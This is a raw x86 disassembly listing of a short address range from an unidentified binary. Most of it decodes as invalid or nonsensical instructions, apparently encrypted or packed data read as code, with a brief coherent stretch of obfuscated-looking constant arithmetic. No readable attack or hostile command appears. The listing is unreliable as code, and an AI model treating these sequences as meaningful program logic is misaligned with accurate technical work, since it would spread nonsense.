  4238bc:	ret    0xe9bd
  4238bf:	cmc    
  4238c0:	loop   0x423873
  4238c2:	test   al,0xd7
  4238c4:	rol    esp,cl
  4238c6:	rcr    ebp,1
  4238c8:	call   0xbe012fb7
  4238cd:	(bad)  
  4238ce:	out    dx,al
  4238cf:	lock in eax,0xf4
  4238d2:	cli    
  4238d3:	stc    
  4238d4:	mov    DWORD PTR [edx+ecx*8],0xa0ecb03
  4238db:	iret   
  4238dc:	mov    edi,0xb7b2f0ea
  4238e1:	iret   
  4238e2:	(bad)  
  4238e3:	jmp    0x42389d
  4238e5:	enter  0xfdac,0xe3
  4238e9:	ret    
  4238ea:	std    
  4238eb:	loope  0x4238bb
  4238ed:	std    
  4238ee:	fdivrp st(5),st
  4238f0:	(bad)  [ebx]
  4238f2:	std    
  4238f3:	jecxz  0x4238d1
  4238f5:	dec    bh
  4238f7:	call   0xf4111cbe
  4238fc:	lds    ebp,FWORD PTR [edi+esi*4-0x11152d10]
  423903:	stc    
  423904:	(bad)  
  423905:	(bad)  
  423906:	mov    ecx,0xe9ffd5ed
  42390b:	(bad)  
  42390d:	std    
  42390e:	aad    0xcd
  423910:	inc    ebp
  423912:	std    
  423913:	fiadd  WORD PTR [edx+ecx*1]
  423916:	in     eax,dx
  423917:	iret   
  423918:	int    0x4
  42391a:	out    0xeb,eax
  42391c:	in     eax,0xb1
  42391e:	retf   
  42391f:	into   
  423920:	enter  0xd1ef,0xe6
  423924:	mov    cl,0xee
  423926:	(bad)  
  423927:	ror    ah,1
  423929:	fdecstp 
  42392b:	clc    
  42392c:	cld    
  42392d:	out    dx,al
  42392e:	repz rol BYTE PTR [ebx],1
  423931:	fsubr  st(4),st
  423933:	std    
  423934:	stc    
  423935:	out    dx,eax
  423936:	jecxz  0x423925
  423938:	in     eax,0xea
  42393a:	int3   
  42393b:	fnsave [edx-0x520c3d50]
  423941:	cmc    
  423942:	in     eax,dx
  423943:	(bad)  
  423944:	out    0xc9,al
  423946:	mov    edx,0xeff7dbee
  42394b:	(bad)  
  42394c:	mov    ebp,0x7bbf0d5
  423951:	cli    
  423952:	lock loopne 0x42391c
  423955:	iret   
  423956:	jmp    0x10254954
  42395b:	loopne 0x423919
  42395d:	lods   al,BYTE PTR ds:[esi]
  42395e:	leave  
  42395f:	cmc    
  423960:	out    0xb0,eax
  423962:	(bad)  
  423963:	in     al,0xfa
  423965:	lock (bad) 
  423968:	(bad)  
  423969:	ret    
  42396a:	icebp  
  42396b:	stc    
  42396c:	fcmovbe st,st(2)
  42396e:	fsubrp st(5),st
  423970:	rol    dl,1
  423972:	(bad)  
  423974:	retf   
  423975:	retf   
  423976:	or     ch,dh
  423978:	(bad)  
  423979:	jmp    0xb7b7:0xe3a8ce07
  423980:	mov    esp,0xcff2d7b5
  423985:	(bad)  
  423986:	imul   cl
  423988:	out    dx,al
  423989:	loop   0x423978
  42398b:	shr    al,1
  42398d:	hlt    
  42398e:	inc    BYTE PTR [edi]
  423990:	fsubrp st(1),st
  423992:	sti    
  423993:	(bad)  [eax]
  423995:	les    eax,FWORD PTR [esi]
  423997:	clc    
  423998:	xabort 0xd
  42399b:	mov    edi,0xf6eda5e9
  4239a0:	mov    esp,0xcef8c2fa
  4239a5:	mov    bh,0xd7
  4239a7:	(bad)  
  4239a8:	hlt    
  4239a9:	mov    edi,0xdecc00d0
  4239ae:	fcomp  st(5)
  4239b0:	add    bh,BYTE PTR [ecx-0xa21f70e]
  4239b6:	fisttp DWORD PTR [eax]
  4239b8:	add    ebx,ecx
  4239ba:	or     ecx,esi
  4239bc:	not    esi
  4239be:	out    dx,eax
  4239bf:	jmp    0xbb0ffc86
  4239c4:	repz lock jmp 0x4239ba
  4239c8:	enter  0x1d2,0xd4
  4239cc:	(bad)  
  4239ce:	div    edx
  4239d0:	ffree  st(1)
  4239d2:	fmul   DWORD PTR [ecx]
  4239d4:	jmp    esi
  4239d6:	add    esp,eax
  4239d8:	fmul   st,st(3)
  4239da:	repnz loopne 0x42399d
  4239dd:	ret    
  4239de:	lock ret 
  4239e0:	mov    bl,0xf0
  4239e2:	loop   0x423997
  4239e4:	vpaddsb xmm7,xmm6,XMMWORD PTR [eax-0x3c0f214e]
  4239ec:	add    dl,dl
  4239ee:	lock aam 0xf3
  4239f1:	loop   0x4239f7
  4239f3:	add    eax,0x1c4df
  4239f8:	(bad)  
  4239f9:	jmp    0x4239fc
  4239fb:	into   
  4239fc:	jmp    0x4239be
  4239fe:	retf   0xaeb3
  423a01:	jmp    0x3804b7
  423a06:	(bad)  
  423a07:	neg    ebp
  423a09:	std    
  423a0a:	in     al,dx
  423a0b:	mov    ebp,0xbdc0e303
  423a10:	icebp  
  423a11:	jecxz  0x4239e3
  423a13:	icebp  
  423a14:	psubq  mm7,QWORD PTR [esp+edi*8-0x35fdfc32]
  423a1c:	stos   BYTE PTR es:[edi],al
  423a1d:	mov    esp,0xdbb4abf7
  423a22:	rol    al,1
  423a24:	div    DWORD PTR [ebp-0x31291a15]
  423a2a:	mov    eax,0xcdf9c1f3
  423a2f:	(bad)  [ebx]
  423a31:	rol    DWORD PTR [eax],1
  423a33:	std    
  423a34:	add    al,0xd9
  423a36:	neg    cl
  423a38:	aam    0xce
  423a3a:	pop    es
  423a3b:	leave  
  423a3c:	mov    esp,0xebb7f5cf
  423a41:	hlt    
  423a42:	(bad)  
  423a43:	fmul   st,st(1)
  423a45:	mov    cl,0xc5
  423a47:	mov    ecx,0xd4bdebb2
  423a4c:	sar    eax,1
  423a4e:	repnz cmc 
  423a50:	hlt    
  423a51:	(bad)  
  423a53:	or     ah,ah
  423a55:	in     eax,0xc7
  423a57:	fisttp QWORD PTR [edx]
  423a59:	clc    
  423a5a:	pop    es
  423a5b:	jmp    0x423a30
  423a5d:	loopne 0x423a32
  423a5f:	xlat   BYTE PTR ds:[ebx]
  423a60:	leave  
  423a61:	retf   
  423a62:	out    dx,eax
  423a63:	fisubr DWORD PTR [esi-0x1c493121]
  423a69:	hlt    
  423a6a:	shr    eax,1
  423a6c:	fucom  st(6)
  423a6e:	mov    edi,0xfdd7f4d2
  423a73:	jmp    0x423a40
  423a75:	or     bl,bh
  423a77:	ret    
  423a78:	(bad)
  423a7b:	in     eax,dx
  423a7c:	in     eax,dx
  423a7d:	scas   al,BYTE PTR es:[edi]
  423a7e:	(bad)  
  423a7f:	shr    cl,0xfb
  423a82:	fidivr DWORD PTR [ecx-0x2e442435]
  423a88:	jmp    0x423a73
  423a8a:	mov    eax,0xb4effbe2
  423a8f:	(bad)  
  423a90:	mov    ebp,0xfabffd04
  423a95:	in     al,0xce
  423a97:	add    al,0xfb
  423a99:	push   cs
  423a9a:	add    ch,BYTE PTR [edi-0x1a2e1f57]
  423aa0:	leave  
  423aa1:	not    dl
  423aa3:	clc    
  423aa4:	mov    ah,0xfa
  423aa6:	(bad)  
  423aa7:	call   0xb834f97f
  423aac:	(bad)  
  423aae:	add    esi,edi
  423ab0:	lock jmp 0xfa0a:0x10fddfa
  423ab8:	fsub   st,st(2)
  423aba:	repz shl esp,1
  423abd:	enter  0xddd2,0xb1
  423ac1:	div    BYTE PTR [esi-0x1217261b]
  423ac7:	fistp  QWORD PTR [ebp+0x7f5b4e8]
  423acd:	add    ebx,esp
  423acf:	(bad)  
  423ad1:	shl    bh,0xc2
  423ad4:	(bad)  
  423ad5:	add    eax,eax
  423ad7:	sti    
  423ad8:	add    esi,ebx
  423ada:	add    ebp,DWORD PTR [esi-0x480d5717]
  423ae0:	scas   al,BYTE PTR es:[edi]
  423ae1:	test   esi,0xddfbfbb1
  423ae7:	mov    ebx,0xf3b8ffd6
  423aec:	cli    
  423aed:	clc    
  423aee:	in     eax,dx
  423aef:	faddp  st(5),st
  423af1:	(bad)  
  423af2:	rol    ch,cl
  423af4:	jmp    0xc4cf:0xcafcc8c7
  423afb:	retf   0xd2cd
  423afe:	scas   eax,DWORD PTR es:[edi]
  423aff:	mov    bl,0xed
  423b01:	sar    DWORD PTR [ebx-0x3308514c],0xf9
  423b08:	cld    
  423b09:	(bad)  
  423b0b:	fcomip st,st(5)
  423b0d:	clc    
  423b0e:	std    
  423b0f:	(bad)  
  423b10:	add    al,0xeb
  423b12:	out    0xc5,al
  423b14:	out    dx,eax
  423b15:	add    al,0xc7
  423b17:	or     al,0xd9
  423b19:	stc    
  423b1a:	shr    DWORD PTR [ebx-0x500a331c],cl
  423b20:	shr    BYTE PTR [ebp+eax*8-0x4a21241a],cl
  423b27:	mov    dh,0xdf
  423b29:	repnz add cl,bh
  423b2c:	fcmovnb st,st(0)
  423b2e:	add    ecx,esi
  423b30:	ret    0xd8d9
  423b33:	ret    0xc00f
  423b36:	in     eax,0x7
  423b38:	enter  0xfc,0xc7
  423b3c:	shl    BYTE PTR [ebp-0x364f2e19],0xa8
  423b43:	out    0xff,al
  423b45:	mov    ecx,0xdccebef7
  423b4a:	in     eax,dx
  423b4b:	mov    ebx,0xc006e2c3
  423b50:	sar    BYTE PTR [ecx-0x25270afa],0xe6
  423b57:	retf   0x3fd
  423b5a:	or     edi,esp
  423b5c:	mov    al,0xcd
  423b5e:	scas   eax,DWORD PTR es:[edi]
  423b5f:	mov    al,0xd3
  423b61:	test   eax,0xf5dad9ec
  423b66:	rcl    ebx,1
  423b68:	in     al,dx
  423b69:	ret    
  423b6a:	leave  
  423b6b:	mov    edx,0xf3daf1cc
  423b70:	mov    esi,0xaf5d4da
  423b75:	or     ecx,DWORD PTR [edi]
  423b77:	push   cs
  423b78:	loopne 0x423b7a
  423b7a:	(bad)  
  423b7c:	in     al,dx
  423b7d:	mov    al,0xe1
  423b7f:	jmp    0xb1140d45
  423b84:	mov    ecx,0xb8e4caf0
  423b89:	mov    edx,0xc300edf9
  423b8e:	add    eax,0xffeac3c7
  423b93:	or     dl,al
  423b95:	add    al,0xe3
  423b97:	fadd   st,st(6)
  423b99:	pop    es
  423b9a:	int    0xbe
  423b9c:	ror    esp,0xf5
  423b9f:	repnz mul ch
  423ba2:	(bad)  
  423ba3:	mov    al,0xbb
  423ba5:	iret   
  423ba6:	out    dx,al
  423ba7:	xlat   BYTE PTR ds:[ebx]
  423ba8:	repnz (bad) 
  423baa:	int    0xfc
  423bac:	fldln2 
  423bae:	cld    
  423baf:	loop   0x423b95
  423bb1:	sti    
  423bb2:	shl    dl,cl
  423bb4:	loop   0x423b85
  423bb6:	in     eax,0xda
  423bb8:	(bad)  
  423bba:	pop    es
  423bbb:	(bad)  
  423bbd:	shl    DWORD PTR [eax-0xa104a10],1
  423bc3:	(bad)  
  423bc4:	mov    bh,0xda
  423bc6:	(bad)  
  423bc7:	aad    0xf5
  423bc9:	clc    
  423bca:	shl    dh,1
  423bcc:	ror    bh,1
  423bce:	into   
  423bcf:	cmc    
  423bd0:	mov    esi,0xd7f1c7dc
  423bd5:	add    eax,0xeb090c0a
  423bda:	jmp    0x423b9a
  423bdc:	fucom  st(4)
  423bde:	in     eax,0xc4
  423be0:	mul    cl
  423be2:	test   al,0xd9
  423be4:	retf   0xd7f7
  423be7:	sar    BYTE PTR [edx-0x1252404],cl
  423bed:	stc    
  423bee:	fdivr  st,st(6)
  423bf0:	add    eax,0xe5f4e4d3
  423bf5:	retf   
  423bf6:	(bad)  
  423bf7:	in     al,dx
  423bf8:	(bad)  
  423bf9:	or     bl,cl
  423bfb:	ret    
  423bfc:	lds    ebp,FWORD PTR [edi-0x53163b23]
  423c02:	mov    cl,0xf8
  423c04:	int    0xe7
  423c06:	retf   
  423c07:	std    
  423c08:	mov    ecx,0xd6cfd8bb
  423c0d:	push   es
  423c0e:	add    dh,dh
  423c10:	add    cl,BYTE PTR [edx]
  423c12:	shl    ah,1
  423c14:	fcmovne st,st(7)
  423c16:	(bad)  
  423c17:	(bad)  
  423c19:	dec    ecx
  423c1b:	repnz mov eax,0xb7c2f6eb
  423c21:	cmc    
  423c22:	jmp    0xbbfd:0xd5f7c7ba
  423c29:	mov    ebp,0xe1f3c3e1
  423c2e:	cld    
  423c2f:	aam    0xbd
  423c31:	(bad)  
  423c32:	in     eax,0xfd
  423c34:	in     al,0xcf
  423c36:	(bad)  
  423c37:	jmp    0x423c25
  423c39:	(bad)
  423c3c:	out    0xea,al
  423c3e:	jmp    0xa8f602ef
  423c43:	iret   
  423c44:	scas   al,BYTE PTR es:[edi]
  423c45:	shr    ebx,1
  423c47:	(bad)  
  423c49:	mov    eax,0xbdbaf4c9
  423c4e:	ret    
  423c4f:	add    al,0xbe
  423c51:	out    0xdd,eax
  423c53:	fldl2e 
  423c55:	stc    
  423c56:	fxch   st(2)
  423c58:	int    0x3
  423c5a:	in     eax,dx
  423c5b:	out    0xdf,al
  423c5d:	in     al,0xd7
  423c5f:	loope  0x423c43
  423c61:	(bad)  
  423c62:	shl    bh,1
  423c64:	mov    ecx,0xfbf1bfe8
  423c69:	leave  
  423c6a:	hlt    
  423c6b:	(bad)  
  423c6d:	fld    DWORD PTR [edi]
  423c6f:	mov    esp,0xcaf7c4dd
  423c74:	or     BYTE PTR [ebp-0x11030218],bh
  423c7a:	in     al,dx
  423c7b:	leave  
  423c7c:	mov    ebp,0xb5acf3e6
  423c81:	shl    al,1
  423c83:	fcmovne st,st(2)
  423c85:	(bad)  
  423c86:	in     al,dx
  423c87:	sar    esp,cl
  423c89:	rcl    ebx,cl
  423c8b:	mov    esp,0xc7f4fccf
  423c90:	(bad)  
  423c92:	push   es
  423c93:	les    eax,FWORD PTR [edx]
  423c95:	fild   WORD PTR [edi]
  423c97:	(bad)  
  423c98:	into   
  423c99:	fucomip st,st(1)
  423c9b:	rol    bh,1
  423c9d:	out    dx,eax
  423c9e:	mov    bh,0xe6
  423ca0:	call   0xfa193496
  423ca5:	xlat   BYTE PTR ds:[ebx]
  423ca6:	fmulp  st(6),st
  423ca8:	int3   
  423ca9:	fcmove st,st(5)
  423cab:	aad    0xb9
  423cad:	rcr    bl,0x5
  423cb0:	aad    0xe2
  423cb2:	jmp    0x423c90
  423cb4:	retf   
  423cb5:	iret   
  423cb6:	out    0xe2,al
  423cb8:	adc    edi,eax
  423cba:	iret   
  423cbb:	ror    dh,0xed
  423cbe:	mov    dh,0xd2
  423cc0:	jmp    0x423ca9
  423cc2:	lods   al,BYTE PTR ds:[esi]
  423cc3:	jmp    0xf00c28bd
  423cc8:	int3   
  423cc9:	call   0xf249f6cc
  423cce:	fcom   st(6)
  423cd0:	neg    dh
  423cd2:	add    bl,cl
  423cd4:	push   es
  423cd5:	loop   0x423cb6
  423cd7:	retf   0xcdce
  423cda:	add    esi,ebx
  423cdc:	out    dx,eax
  423cdd:	mov    esp,0xe3c9cae4
  423ce2:	mov    al,0xf4
  423ce4:	out    dx,eax
  423ce5:	icebp  
  423ce6:	aad    0xff
  423ce8:	int    0xc8
  423cea:	std    
  423ceb:	jmp    ecx
  423ced:	clc    
  423cee:	into   
  423cef:	sti    
  423cf0:	fcmovnbe st,st(1)
  423cf2:	repnz or eax,DWORD PTR [edi]
  423cf5:	xlat   BYTE PTR ds:[ebx]
  423cf6:	out    dx,eax
  423cf7:	add    edi,ebp
  423cf9:	push   es
  423cfa:	out    0xbc,eax
  423cfc:	in     al,dx
  423cfd:	lods   eax,DWORD PTR ds:[esi]
  423cfe:	rol    dh,1
  423d00:	shl    DWORD PTR [esi+esi*4-0x24290d0b],cl
  423d07:	mov    ebp,0xdcf1ddcf
  423d0c:	loopne 0x423ce0
  423d0e:	add    eax,edi
  423d10:	lock imul dl
  423d13:	fcomp  st(4)
  423d15:	or     BYTE PTR [edx],cl
  423d17:	out    dx,eax
  423d18:	les    edx,FWORD PTR [edx]
  423d1a:	into   
  423d1b:	loope  0x423cfe
  423d1d:	mov    esp,0xc9e3e1b1
  423d22:	jmp    0xcdfe290e
  423d27:	(bad)  
  423d28:	iret   
  423d29:	fcmovnbe st,st(0)
  423d2b:	mov    eax,0xd1d7b8c8
  423d30:	aad    0xda
  423d32:	(bad)
  423d36:	enter  0x8c4,0xc1
  423d3a:	fnstsw WORD PTR [esi-0x101a2f29]
  423d40:	in     al,0xc3
  423d42:	enter  0xbbc8,0xda
  423d46:	stc    
  423d47:	into   
  423d48:	call   0xc8fe2e1d
  423d4d:	std    
  423d4e:	fadd   st,st(5)
  423d50:	sar    dh,1
  423d52:	lock fadd st(2),st
  423d55:	fadd   DWORD PTR [eax]
  423d57:	std    
  423d58:	jmp    0xb12f5042
  423d5d:	enter  0xaec4,0xca
  423d61:	mov    cl,0xe2
  423d63:	aad    0xea
  423d65:	mov    ebx,0xd3dcdbee
  423d6a:	jmp    0xffd8:0x2e3ceb9
  423d71:	clc    
  423d72:	std    
  423d73:	mov    edi,0xfa0bfce4
  423d78:	add    BYTE PTR [eax],cl
  423d7a:	or     ebp,DWORD PTR [ebx-0x1e181e5a]
  423d80:	jmp    0xc9b9:0xd0e5ebc7
  423d87:	sar    DWORD PTR [ebp-0x10160e23],cl
  423d8d:	fcmovbe st,st(2)
  423d8f:	mov    esp,0xf1dcfd04
  423d94:	lock cmc 
  423d96:	(bad)
  423d99:	fsubp  st(3),st
  423d9b:	call   0xb015ec6b
  423da0:	jecxz  0x423d92
  423da2:	enter  0xcee6,0xfa
  423da6:	mov    dh,0xce
  423da8:	mov    edx,0xd4effac9
  423dad:	add    eax,DWORD PTR ds:0xc2d3f8de
  423db3:	ror    ecx,0xf6
  423db6:	add    eax,esi
  423db8:	or     al,0xe1
  423dba:	dec    ebp
  423dbc:	shl    bh,cl
  423dbe:	mov    bh,0xec
  423dc0:	lods   al,BYTE PTR ds:[esi]
  423dc1:	out    0xcc,eax
  423dc3:	int    0xb6
  423dc5:	div    bl
  423dc7:	retf   
  423dc8:	cli    
  423dc9:	ret    
  423dca:	out    dx,eax
  423dcb:	add    esp,edx
  423dcd:	out    dx,eax
  423dce:	add    dh,ah
  423dd0:	mov    esp,0xefcbf4c6
  423dd6:	fld    st(3)
  423dd8:	or     al,0xd
  423dda:	in     eax,dx
  423ddb:	ret    
  423ddc:	(bad)  
  423ddd:	jmp    0x423d90
  423ddf:	shr    BYTE PTR [esi-0x282b1d11],1
  423de5:	aam    0xac
  423de7:	xlat   BYTE PTR ds:[ebx]
  423de8:	idiv   BYTE PTR [edx+ebx*8-0x21fd2a2a]
  423def:	add    al,dh
  423df1:	clc    
  423df2:	loope  0x423df3
  423df4:	call   0x42b41f4
  423df9:	(bad)
  423dfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423dfd:	shl    ecx,1
  423dff:	in     al,0xad
  423e01:	(bad)  
  423e02:	ror    edx,cl
  423e04:	aad    0xad
  423e06:	mov    ch,0xfe
  423e08:	repnz aam 0xce
  423e0b:	enter  0xd3ce,0xf8
  423e0f:	add    BYTE PTR [esi],al
  423e11:	(bad)  
  423e12:	cmc    
  423e13:	in     eax,0xdc
  423e15:	iret   
  423e16:	add    eax,esp
  423e18:	leave  
  423e19:	cli    
  423e1a:	call   edx
  423e1c:	scas   al,BYTE PTR es:[edi]
  423e1d:	lods   eax,DWORD PTR ds:[esi]
  423e1e:	int    0xe9
  423e20:	ror    ah,0xcb
  423e23:	scas   eax,DWORD PTR es:[edi]
  423e24:	test   bh,0xdb
  423e27:	out    dx,eax
  423e28:	int3   
  423e29:	jmp    0x423e2e
  423e2b:	mov    ebp,0xc2e1d7cc
  423e30:	in     al,dx
  423e31:	in     eax,0xd0
  423e33:	stc    
  423e34:	sti    
  423e35:	or     ebx,esp
  423e37:	loopne 0x423e1c
  423e39:	adc    cl,bl
  423e3b:	in     eax,0xb2
  423e3d:	in     al,dx
  423e3e:	repnz in al,0xc5
  423e41:	aam    0xb4
  423e43:	fadd   st,st(0)
  423e45:	mov    ecx,0xfeb6c5f1
  423e4a:	fucomip st,st(0)
  423e4c:	mov    esp,0xc3bdbede
  423e51:	rol    DWORD PTR [eax],cl
  423e53:	push   es
  423e54:	hlt    
  423e55:	(bad)  
  423e56:	std    
  423e57:	fimul  WORD PTR [ecx]
  423e59:	(bad)
  423e5c:	jmp    0xfbe1:0xb2c7e2ca
  423e63:	aam    0xe7
  423e65:	mov    edx,0xdae3ecf2
  423e6a:	in     eax,dx
  423e6b:	loop   0x423e2f
  423e6d:	mov    ecx,0x1c1d2f7
  423e72:	(bad)  
  423e73:	icebp  
  423e74:	(bad)  
  423e75:	loop   0x423e6b
  423e77:	pop    es
  423e78:	or     eax,0xd3e1c0ff
  423e7d:	mov    edi,0xf7dcf5e7
  423e82:	(bad)  
  423e83:	retf   
  423e84:	mov    ebx,0xc8ecc4cd
  423e89:	mov    esp,0xcff602ea
  423e8e:	add    dh,dl
  423e90:	in     al,dx
  423e91:	aam    0xff
  423e93:	retf   
  423e94:	add    bl,bh
  423e96:	jmp    0xd3e1:0xd2d9ef04
  423e9d:	out    0xde,al
  423e9f:	test   ah,0xd6
  423ea2:	sar    BYTE PTR [ebx-0x40d1a26],1
  423ea8:	mov    edi,0xc8eedcb4
  423ead:	cli    
  423eae:	shl    esp,cl
  423eb0:	(bad)  
  423eb1:	faddp  st(3),st
  423eb3:	out    0xda,al
  423eb5:	push   cs
  423eb6:	cld    
  423eb7:	fcomp  st(3)
  423eb9:	jmp    0xf3ec1f8a
  423ebe:	mul    al
  423ec0:	(bad)  
  423ec3:	retf   0xf7ae
  423ec6:	fxch   st(2)
  423ec8:	(bad)  
  423eca:	loop   0x423ea4
  423ecc:	fcmovbe st,st(1)
  423ece:	out    dx,al
  423ecf:	jecxz  0x423e96
  423ed1:	rcl    esi,0xe0
  423ed4:	or     bh,dh
  423ed6:	out    0xcd,eax
  423ed8:	stc    
  423ed9:	call   edx
  423edb:	mov    cl,0xae
  423edd:	mov    al,0xb7
  423edf:	leave  
  423ee0:	loop   0x423edc
  423ee2:	mov    bh,0xc4
  423ee4:	stc    
  423ee5:	aam    0xe6
  423ee7:	jmp    0x423ec7
  423ee9:	mov    ecx,0xf5c3f3f8
  423eee:	add    eax,edi
  423ef0:	hlt    
  423ef1:	cld    
  423ef2:	sar    dh,0xe9
  423ef5:	cld    
  423ef6:	into   
  423ef7:	lar    ebp,bp
  423efa:	or     eax,0xafd0cccf
  423eff:	hlt    
  423f00:	call   0xee2c2dae
  423f05:	fld    st(6)
  423f07:	mov    esi,0xd5e3daf4
  423f0c:	(bad)  
  423f0d:	xlat   BYTE PTR ds:[ebx]
  423f0e:	fdivrp st(5),st
  423f10:	rol    ebp,cl
  423f12:	fcos   
  423f14:	mov    eax,0xdc00f5ff
  423f1a:	shr    dl,0xec
  423f1d:	mov    esp,0xc9d2f6ea
  423f22:	retf   0xd0b2
  423f25:	sti    
  423f26:	jmp    0xf9e8:0xf4d6f2db
  423f2d:	(bad)  
  423f2f:	hlt    
  423f30:	rol    DWORD PTR ds:0x3f9d40a,cl
  423f36:	(bad)  
  423f37:	loope  0x423f1b
  423f39:	leave  
  423f3a:	cli    
  423f3b:	mov    dl,0xc7
  423f3d:	(bad)  
  423f3e:	repnz hlt 
  423f40:	loope  0x423f30
  423f42:	jmp    0xbecf:0xbbf3cdd7
  423f49:	mov    ch,0xde
  423f4b:	enter  0xd5e1,0xbe
  423f4f:	add    eax,0xf609fcd0
  423f54:	not    bh
  423f56:	add    ebp,ecx
  423f58:	(bad)  [ecx]
  423f5a:	jmp    DWORD PTR [edi-0x14083d3b]
  423f60:	xlat   BYTE PTR ds:[ebx]
  423f61:	shl    BYTE PTR [edx-0x2e1b0c32],cl
  423f67:	shr    ebp,cl
  423f69:	ret    
  423f6a:	(bad)  
  423f6c:	mov    edi,0xf8fbe7d5
  423f71:	push   es
  423f72:	add    ecx,DWORD PTR [ebx]
  423f74:	retf   0xe9c8
  423f77:	jmp    0xa8b8:0xe9f9000b
  423f7e:	ror    ebp,1
  423f80:	shl    DWORD PTR [eax-0x172f2636],1
  423f86:	int3   
  423f87:	leave  
  423f88:	mov    dl,0xf5
  423f8a:	fstp   st(5)
  423f8c:	repz fistp QWORD PTR [eax+0x30bfcd0]
  423f93:	lock push es
  423f95:	mov    ebp,0x3fdfcff
  423f9a:	adc    al,dl
  423f9c:	(bad)  
  423f9d:	mov    esi,0xd6f3e6e4
  423fa2:	repz int 0xdb
  423fa5:	(bad)  
  423fa6:	push   edx
  423fa8:	(bad)  
  423faa:	sar    BYTE PTR [ebx-0x27321130],1
  423fb0:	(bad)  
  423fb1:	lock test esp,0xe8c5fbd7
  423fb8:	call   0xa932408b
  423fbd:	fistp  QWORD PTR [esi-0x2e341c32]
  423fc3:	out    dx,al
  423fc4:	fcomip st,st(6)
  423fc6:	int3   
  423fc7:	rcl    ch,cl
  423fc9:	repnz rcr ah,1
  423fcc:	cld    
  423fcd:	stc    
  423fce:	fcmovnu st,st(0)
  423fd0:	fdiv   st,st(7)
  423fd2:	shl    ebx,1
  423fd4:	(bad)  
  423fd5:	(bad)  
  423fd7:	(bad)  
  423fd9:	sti    
  423fda:	or     esp,esp
  423fdc:	call   0xb10935d1
  423fe1:	ret    0xd1c6
  423fe4:	scas   al,BYTE PTR es:[edi]
  423fe5:	(bad)  
  423fe6:	stc    
  423fe7:	clc    
  423fe8:	div    ah
  423fea:	jecxz  0x423fbe
  423fec:	std    
  423fed:	mov    edi,0xe1c401f5
  423ff2:	shl    esi,1
  423ff4:	sar    ah,0xd5
  423ff7:	jecxz  0x423ffe
  423ff9:	jmp    0xd428ef0c
  423ffe:	fsubp  st(7),st
  424000:	(bad)  
  424001:	mov    bl,0xdb
  424003:	les    ebp,FWORD PTR [esi-0x27150633]
  424009:	mov    eax,0x6fdfdb9
  42400e:	std    
  42400f:	aam    0xcc
  424011:	fadd   QWORD PTR [ecx]
  424013:	stc    
  424014:	in     eax,0x7
  424016:	aad    0x1
  424018:	retf   0xd80c
  42401b:	mov    ecx,0xcab7b3b0
  424020:	rol    esi,1
  424022:	stc    
  424023:	mov    ecx,0xb3d8fbd1
  424028:	add    edx,ecx
  42402a:	mov    esi,0xd7d0d2e8
  42402f:	out    0xe3,al
  424031:	(bad)  
  424032:	sti    
  424033:	test   esp,0x5efdfea
  424039:	in     eax,0x12
  42403b:	enter  0xeee2,0xbd
  42403f:	mov    dh,0xf0
  424041:	mov    dh,0xe9
  424043:	mov    bl,0xce
  424045:	faddp  st(5),st
  424047:	fdivr  QWORD PTR [ecx-0x2e1e4022]
  42404d:	loopne 0x42404b
  42404f:	out    0x5,al
  424051:	xlat   BYTE PTR ds:[ebx]
  424052:	hlt    
  424053:	in     al,0x4
  424055:	push   cs
  424056:	shl    ah,0xc8
  424059:	fiadd  WORD PTR [edi]
  42405b:	fucomip st,st(6)
  42405d:	imul   BYTE PTR [esi-0x2e252a1a]
  424063:	mov    ch,0xf3
  424065:	lock aad 0xf0
  424068:	call   eax
  42406a:	fchs   
  42406c:	fnstcw WORD PTR [eax+eiz*8-0x7382f06]
  424073:	frstpm(287 only) 
  424075:	push   cs
  424076:	retf   0xfddd
  424079:	fdivp  st(4),st
  42407b:	stos   BYTE PTR es:[edi],al
  42407c:	out    dx,al
  42407d:	shr    BYTE PTR [eax-0x81f192a],0xd8
  424084:	jmp    0xd0f5ed36
  424089:	call   0xff360e63
  42408e:	mov    esp,0xd7f7c5d9
  424093:	std    
  424094:	add    al,0xee
  424096:	add    eax,ebp
  424098:	add    al,0x12
  42409a:	add    bh,ah
  42409c:	shr    DWORD PTR [ecx-0x1a532a1a],1
  4240a2:	mov    ah,0xc1
  4240a4:	in     eax,0xd5
  4240a6:	repz mov ebp,0xcedfd8dc
  4240ac:	mov    esi,0xc2f4f9df
  4240b1:	add    al,0x5
  4240b3:	push   es
  4240b4:	fcomip st,st(7)
  4240b6:	(bad)  
  4240b7:	cli    
  4240b8:	add    ah,dl
  4240ba:	loopne 0x424094
  4240bc:	leave  
  4240bd:	fsubr  QWORD PTR [eax-0x482c1e24]
  4240c3:	shl    BYTE PTR [esi-0xc331105],cl
  4240c9:	push   DWORD PTR ds:0x75108b5
  4240cf:	add    eax,0x3272fb
  4240d4:	mov    DWORD PTR [ebp-0x80],eax
  4240d7:	jmp    0x4240f1
  4240dc:	mov    eax,DWORD PTR [ebp+0xc]
  4240df:	xor    eax,0x75108b5
  4240e4:	mov    ecx,DWORD PTR [ebp-0x80]
  4240e7:	lea    eax,[ecx+eax*1+0x3272fb]
  4240ee:	mov    DWORD PTR [ebp-0x80],eax
  4240f1:	mov    eax,DWORD PTR [ebp-0x80]
  4240f4:	jmp    0x42649a
  4240f9:	sub    BYTE PTR [edx+esi*4+0x3a],bl
  4240fd:	not    BYTE PTR [eax+esi*2+0x6c]
  424101:	push   esi
  424102:	je     0x4240ee
  424104:	hlt    
  424105:	adc    al,0xd8
  424107:	add    DWORD PTR [ebx],edx
  424109:	in     al,0x64
  42410b:	jp     0x424188
  42410d:	add    bl,BYTE PTR [eax-0x3c228485]
  424113:	idiv   ch
  424115:	in     eax,dx
  424116:	in     eax,dx
  424117:	sar    esi,cl
  424119:	add    al,0xdd
  42411b:	ror    edi,0xb
  42411e:	std    
  42411f:	add    ecx,ebx
  424121:	push   es
  424122:	icebp  
  424123:	mov    esp,0xe2aeadc8
  424128:	(bad)  
  424129:	retf   
  42412a:	rcl    ch,cl
  42412c:	into   
  42412d:	jmp    0x4240f4
  42412f:	shl    dl,1
  424131:	clc    
  424132:	out    dx,al
  424133:	pop    es
  424134:	mov    ch,0xd3
  424136:	ret    0xe0d2
  424139:	loop   0x424115
  42413b:	cli    
  42413c:	out    dx,eax
  42413d:	or     eax,0xe4e0e7f8
  424142:	jmp    0x424108
  424144:	shr    DWORD PTR [edi-0x817193d],1
  42414a:	iret   
  42414b:	(bad)  
  42414d:	mov    edx,0xd9b4dbee
  424152:	call   0xc43f0429
  424157:	fst    st(1)
  424159:	ret    
  42415a:	xlat   BYTE PTR ds:[ebx]
